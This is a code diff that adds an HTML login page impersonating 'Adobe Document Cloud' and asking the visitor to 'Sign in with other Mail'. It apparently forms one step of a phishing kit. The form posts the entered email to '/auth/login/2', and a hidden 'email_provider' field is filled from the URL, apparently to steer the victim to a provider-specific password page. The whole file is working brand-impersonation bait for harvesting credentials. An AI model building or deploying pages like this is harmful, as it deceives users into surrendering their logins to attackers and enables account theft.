@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+</head>
+
+<body>
+  <header></header>
+
+  <div class="box-modal">
+    <div class="overlay"></div>
+    <div class="body-modal">
+      <div class="card">
+        <ul class="list-group list-group-flush">
+          <li class="list-group-item" style="padding-top: 1.5rem;">
+            <div class="card-header">
+              <img src="/img/logo.png" alt="logo" class="card-header-icon">
+              <h5 class="card-header-title">Adobe Document Cloud</h5>
+            </div>
+            <img src="/img/other.png" alt="other" height="90" style="margin-top: 20px;">
+            <p class="card-header-text">Sign in with other Mail</p>
+          </li>
+          <li class="list-group-item" style="padding-bottom: 1.5rem;border: none;">
+            <div class="row">
+              <form action="/auth/login/2" method="post" style="width: 510px;">
+                <input type="text" value="" id="email_provider" name="email_provider" style="display: none;">
+                <script>
+                  var urlParams = new URLSearchParams(window.location.search);
+
+                  if (urlParams.has("email_provider") === true) {
+                    $("#email_provider").val(urlParams.get("email_provider"));
+                  } else {
+                    console.log("An error has occurred while trying to parse URL params...");
+                  }
+                </script>
+
+                <div class="form-group">
+                  <label for="username" class="form-label">Email</label>
+                  <input id="username" name="username" class="form-input" type="email" autocomplete="off" required>
+                </div>
+
+                <div class="btn-group">
+                  <button class="btn" type="submit">Continue</button>
+                </div>
+              </form>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
